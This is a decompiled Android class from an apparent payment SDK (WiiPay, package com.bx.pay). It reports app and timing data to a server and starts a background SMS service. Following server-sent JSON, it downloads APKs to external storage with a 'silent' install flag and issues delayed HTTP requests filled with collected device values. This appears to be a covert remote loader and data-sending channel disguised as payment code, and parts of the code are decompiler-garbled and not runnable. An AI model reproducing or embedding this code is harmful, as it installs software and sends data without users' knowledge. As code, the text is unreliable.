package com.bx.pay;

import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import com.bx.pay.utils.n;
import java.io.File;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Set;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public final class a
{
  private static Context a;
  private static SharedPreferences b;
  private static ServiceConnection c = new b();
  private static Handler d = new c(Looper.getMainLooper());
  private static Handler e = new d(Looper.getMainLooper());
  
  private static String a(Map paramMap)
  {
    if (paramMap == null)
    {
      paramMap = "";
      return paramMap;
    }
    Object localObject = new StringBuffer();
    paramMap = paramMap.entrySet().iterator();
    for (;;)
    {
      if (!paramMap.hasNext())
      {
        localObject = ((StringBuffer)localObject).toString();
        paramMap = (Map)localObject;
        if (!((String)localObject).endsWith("&")) {
          break;
        }
        return n.b((String)localObject, "&");
      }
      Map.Entry localEntry = (Map.Entry)paramMap.next();
      ((StringBuffer)localObject).append((String)localEntry.getKey() + "=" + (String)localEntry.getValue());
      ((StringBuffer)localObject).append("&");
    }
  }
  
  public static void a(Context paramContext)
  {
    a = paramContext;
    com.bx.pay.a.c.a = paramContext;
    try
    {
      com.bx.pay.netx.a.a(a);
      try
      {
        Object localObject2 = a.getPackageManager().getApplicationInfo(a.getPackageName(), 128).metaData;
        String str = ((Bundle)localObject2).get("WIIPAY_APP_ID").toString();
        Object localObject1 = c(a);
        paramContext = (Context)localObject1;
        if (n.a(localObject1)) {
          paramContext = ((Bundle)localObject2).get("WIIPAY_CHANNEL_CODE").toString();
        }
        com.bx.pay.a.d.a(a);
        com.bx.pay.a.d.x.put("appId", str);
        com.bx.pay.a.d.x.put("channelCode", paramContext);
        localObject1 = Long.valueOf(new Date().getTime());
        localObject2 = n.a(new Date());
        com.bx.pay.a.d.x.put("startTime", String.valueOf(localObject1));
        com.bx.pay.a.d.x.put("startTimeString", localObject2);
        Object localObject3 = a.getSharedPreferences("wiipay", 0);
        b = (SharedPreferences)localObject3;
        localObject3 = ((SharedPreferences)localObject3).edit();
        ((SharedPreferences.Editor)localObject3).putString("appId", str);
        ((SharedPreferences.Editor)localObject3).putString("startTime", String.valueOf(localObject1));
        ((SharedPreferences.Editor)localObject3).putString("startTimeString", (String)localObject2);
        ((SharedPreferences.Editor)localObject3).putString("channelCode", paramContext);
        ((SharedPreferences.Editor)localObject3).commit();
        l.a().a(a.getApplicationContext());
        c();
      }
      catch (PackageManager.NameNotFoundException paramContext)
      {
        for (;;)
        {
          paramContext.printStackTrace();
        }
      }
      catch (Exception paramContext)
      {
        for (;;)
        {
          paramContext.printStackTrace();
        }
      }
      b(a);
      return;
    }
    catch (Exception paramContext)
    {
      for (;;) {}
    }
  }
  
  private static void a(JSONArray paramJSONArray)
  {
    int i;
    if (paramJSONArray != null) {
      i = 0;
    }
    for (;;)
    {
      if (i >= paramJSONArray.length()) {}
      for (;;)
      {
        return;
        try
        {
          if (!paramJSONArray.isNull(i))
          {
            Object localObject1 = paramJSONArray.getJSONObject(i);
            if ((localObject1 != null) && (!((JSONObject)localObject1).isNull("pn")) && (!n.a(((JSONObject)localObject1).getString("pn"))))
            {
              String str2 = ((JSONObject)localObject1).getString("pn");
              String str1 = "1";
              if (!((JSONObject)localObject1).isNull("silent")) {
                str1 = ((JSONObject)localObject1).getString("silent");
              }
              if (!a(str2))
              {
                localObject1 = paramJSONArray.getJSONObject(i).getString("url");
                Object localObject2 = ((String)localObject1).substring(((String)localObject1).lastIndexOf("/") + 1);
                localObject2 = new File(Environment.getExternalStorageDirectory(), (String)localObject2);
                HashMap localHashMap = new HashMap();
                localHashMap.put("packageName", str2);
                localHashMap.put("silent", str1);
                com.bx.pay.netx.b.a((File)localObject2, (String)localObject1, localHashMap, e);
              }
            }
          }
        }
        catch (JSONException localJSONException)
        {
          for (;;)
          {
            localJSONException.printStackTrace();
          }
        }
      }
      i += 1;
    }
  }
  
  private static boolean a(String paramString)
  {
    if ((paramString == null) || ("".equals(paramString))) {
      return false;
    }
    try
    {
      a.getPackageManager().getApplicationInfo(paramString, 8192);
      return true;
    }
    catch (PackageManager.NameNotFoundException paramString) {}
    return false;
  }
  
  public static void b(Context paramContext)
  {
    try
    {
      paramContext.startService(new Intent(paramContext, WpaySmsService.class));
      return;
    }
    catch (Exception paramContext) {}
  }
  
  private static void b(JSONArray paramJSONArray)
  {
    int i;
    if (paramJSONArray != null)
    {
      i = 0;
      if (i < paramJSONArray.length()) {}
    }
    else
    {
      label14:
      return;
    }
    label227:
    label396:
    label432:
    label437:
    label444:
    label452:
    label459:
    label468:
    label475:
    label480:
    for (;;)
    {
      Object localObject2;
      String str4;
      String str2;
      String str3;
      int j;
      int m;
      int k;
      try
      {
        if (paramJSONArray.isNull(i)) {
          break label14;
        }
        localObject2 = paramJSONArray.getJSONObject(i);
        if (localObject2 == null) {
          break label468;
        }
        if (((JSONObject)localObject2).isNull("url")) {
          break label14;
        }
        str4 = ((JSONObject)localObject2).getString("url");
        if (((JSONObject)localObject2).isNull("params")) {
          break label452;
        }
        localObject1 = ((JSONObject)localObject2).getString("params");
        if (((JSONObject)localObject2).isNull("method")) {
          break label444;
        }
        str2 = n.a(((JSONObject)localObject2).getString("method"), "GET");
        if (!((JSONObject)localObject2).isNull("form")) {
          n.a(((JSONObject)localObject2).getString("form"), "1");
        }
        if (((JSONObject)localObject2).isNull("bodyContentType")) {
          break label437;
        }
        str3 = n.a(((JSONObject)localObject2).getString("bodyContentType"), "");
        if (((JSONObject)localObject2).isNull("delay")) {
          break label432;
        }
        j = Integer.valueOf(n.a(((JSONObject)localObject2).getString("delay"), "1")).intValue();
        localObject2 = new HashMap();
        localObject1 = ((String)localObject1).split("&");
        if ((localObject1 != null) && (localObject1.length > 0))
        {
          m = localObject1.length;
          k = 0;
          break label459;
        }
        if (!"GET".equals(str2)) {
          break label396;
        }
        localObject1 = a((Map)localObject2);
        localObject1 = str4 + (String)localObject1;
        new Handler(Looper.getMainLooper()).postDelayed(new f((String)localObject1), j * 1000);
      }
      catch (JSONException localJSONException)
      {
        Object localObject1;
        String[] arrayOfString;
        localJSONException.printStackTrace();
      }
      arrayOfString = localObject1[k].split("=");
      if ((arrayOfString != null) && (arrayOfString.length == 2)) {
        if (arrayOfString[1].startsWith("@"))
        {
          ((Map)localObject2).put(arrayOfString[0], (String)com.bx.pay.a.d.x.get(arrayOfString[1].substring(1)));
        }
        else
        {
          ((Map)localObject2).put(arrayOfString[0], arrayOfString[1]);
          break label475;
          new Handler(Looper.getMainLooper()).postDelayed(new g(str4, (Map)localObject2, str3), j * 1000);
          break label468;
          j = 1;
          continue;
          str3 = "";
          continue;
          str2 = "GET";
          continue;
          String str1 = "";
          continue;
        }
      }
      for (;;)
      {
        if (k < m) {
          break label480;
        }
        break label227;
        i += 1;
        break;
        k += 1;
      }
    }
  }
  
  /* Error */
  private static String c(Context paramContext)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: aload_0
    //   3: invokevirtual 539	android/content/Context:getApplicationInfo	()Landroid/content/pm/ApplicationInfo;
    //   6: getfield 542	android/content/pm/ApplicationInfo:sourceDir	Ljava/lang/String;
    //   9: astore_0
    //   10: new 544	java/util/zip/ZipFile
    //   13: dup
    //   14: aload_0
    //   15: invokespecial 545	java/util/zip/ZipFile:<init>	(Ljava/lang/String;)V
    //   18: astore_2
    //   19: aload_2
    //   20: astore_0
    //   21: aload_2
    //   22: invokevirtual 549	java/util/zip/ZipFile:entries	()Ljava/util/Enumeration;
    //   25: astore 4
    //   27: aload_2
    //   28: astore_0
    //   29: aload 4
    //   31: invokeinterface 554 1 0
    //   36: istore_1
    //   37: iload_1
    //   38: ifne +41 -> 79
    //   41: ldc 47
    //   43: astore_0
    //   44: aload_2
    //   45: invokevirtual 556	java/util/zip/ZipFile:close	()V
    //   48: aload_0
    //   49: ldc_w 558
    //   52: invokevirtual 417	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   55: astore_2
    //   56: aload_2
    //   57: ifnull +122 -> 179
    //   60: aload_2
    //   61: arraylength
    //   62: iconst_2
    //   63: if_icmplt +116 -> 179
    //   66: aload_0
    //   67: aload_2
    //   68: iconst_0
    //   69: aaload
    //   70: invokevirtual 559	java/lang/String:length	()I
    //   73: iconst_1
    //   74: iadd
    //   75: invokevirtual 292	java/lang/String:substring	(I)Ljava/lang/String;
    //   78: areturn
    //   79: aload_2
    //   80: astore_0
    //   81: aload 4
    //   83: invokeinterface 562 1 0
    //   88: checkcast 564	java/util/zip/ZipEntry
    //   91: invokevirtual 567	java/util/zip/ZipEntry:getName	()Ljava/lang/String;
    //   94: astore_3
    //   95: aload_2
    //   96: astore_0
    //   97: aload_3
    //   98: ldc_w 569
    //   101: invokevirtual 526	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   104: istore_1
    //   105: iload_1
    //   106: ifeq -79 -> 27
    //   109: aload_3
    //   110: astore_0
    //   111: goto -67 -> 44
    //   114: astore_3
    //   115: aconst_null
    //   116: astore_2
    //   117: aload_2
    //   118: astore_0
    //   119: aload_3
    //   120: invokevirtual 570	java/io/IOException:printStackTrace	()V
    //   123: aload_2
    //   124: ifnull +58 -> 182
    //   127: aload_2
    //   128: invokevirtual 556	java/util/zip/ZipFile:close	()V
    //   131: ldc 47
    //   133: astore_0
    //   134: goto -86 -> 48
    //   137: astore_0
    //   138: aload_0
    //   139: invokevirtual 570	java/io/IOException:printStackTrace	()V
    //   142: ldc 47
    //   144: astore_0
    //   145: goto -97 -> 48
    //   148: astore_3
    //   149: aload_0
    //   150: astore_2
    //   151: aload_3
    //   152: astore_0
    //   153: aload_2
    //   154: ifnull +7 -> 161
    //   157: aload_2
    //   158: invokevirtual 556	java/util/zip/ZipFile:close	()V
    //   161: aload_0
    //   162: athrow
    //   163: astore_2
    //   164: aload_2
    //   165: invokevirtual 570	java/io/IOException:printStackTrace	()V
    //   168: goto -7 -> 161
    //   171: astore_2
    //   172: aload_2
    //   173: invokevirtual 570	java/io/IOException:printStackTrace	()V
    //   176: goto -128 -> 48
    //   179: ldc 47
    //   181: areturn
    //   182: ldc 47
    //   184: astore_0
    //   185: goto -137 -> 48
    //   188: astore_3
    //   189: goto -72 -> 117
    //   192: astore_0
    //   193: aload_3
    //   194: astore_2
    //   195: goto -42 -> 153
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	198	0	paramContext	Context
    //   36	70	1	bool	boolean
    //   18	140	2	localObject1	Object
    //   163	2	2	localIOException1	java.io.IOException
    //   171	2	2	localIOException2	java.io.IOException
    //   194	1	2	localIOException3	java.io.IOException
    //   1	109	3	str	String
    //   114	6	3	localIOException4	java.io.IOException
    //   148	4	3	localObject2	Object
    //   188	6	3	localIOException5	java.io.IOException
    //   25	57	4	localEnumeration	java.util.Enumeration
    // Exception table:
    //   from	to	target	type
    //   10	19	114	java/io/IOException
    //   127	131	137	java/io/IOException
    //   21	27	148	finally
    //   29	37	148	finally
    //   81	95	148	finally
    //   97	105	148	finally
    //   119	123	148	finally
    //   157	161	163	java/io/IOException
    //   44	48	171	java/io/IOException
    //   21	27	188	java/io/IOException
    //   29	37	188	java/io/IOException
    //   81	95	188	java/io/IOException
    //   97	105	188	java/io/IOException
    //   10	19	192	finally
  }
  
  private static void c()
  {
    try
    {
      if (b == null) {
        b = a.getSharedPreferences("wiipay", 0);
      }
      if (b != null)
      {
        localObject1 = Long.valueOf(b.getLong("prefetchTime", 0L));
        if ((((Long)localObject1).longValue() > 0L) && (((Long)localObject1).longValue() - System.currentTimeMillis() < 60000L)) {
          return;
        }
        localObject1 = b.edit();
        ((SharedPreferences.Editor)localObject1).putLong("prefetchTime", System.currentTimeMillis());
        ((SharedPreferences.Editor)localObject1).commit();
      }
    }
    catch (Exception localException)
    {
      Object localObject1;
      Object localObject2;
      for (;;) {}
    }
    localObject1 = new HashMap();
    localObject2 = com.bx.pay.a.d.x.entrySet().iterator();
    for (;;)
    {
      if (!((Iterator)localObject2).hasNext())
      {
        ((Map)localObject1).put("paysdk", com.bx.pay.a.d.b("201"));
        new com.bx.pay.netx.b(com.bx.pay.a.d.n, (Map)localObject1, d).a(60000).b(1).a(Boolean.valueOf(false)).a();
        localObject2 = new HashMap();
        ((Map)localObject2).put("packageName", (String)((Map)localObject1).get("packageName"));
        ((Map)localObject2).put("paysdk", (String)((Map)localObject1).get("paysdk"));
        ((Map)localObject2).put("paysdkName", (String)((Map)localObject1).get("paysdkName"));
        ((Map)localObject2).put("sdkAppCode", (String)((Map)localObject1).get("sdkAppCode"));
        ((Map)localObject2).put("sdkChannelCode", (String)((Map)localObject1).get("sdkChannelCode"));
        new com.bx.pay.netx.b(com.bx.pay.a.d.o, (Map)localObject2, new e()).a(5000).b(0).a(Boolean.valueOf(false)).a();
        return;
      }
      Map.Entry localEntry = (Map.Entry)((Iterator)localObject2).next();
      if (!n.a(localEntry.getValue())) {
        ((Map)localObject1).put((String)localEntry.getKey(), (String)localEntry.getValue());
      }
    }
  }
}
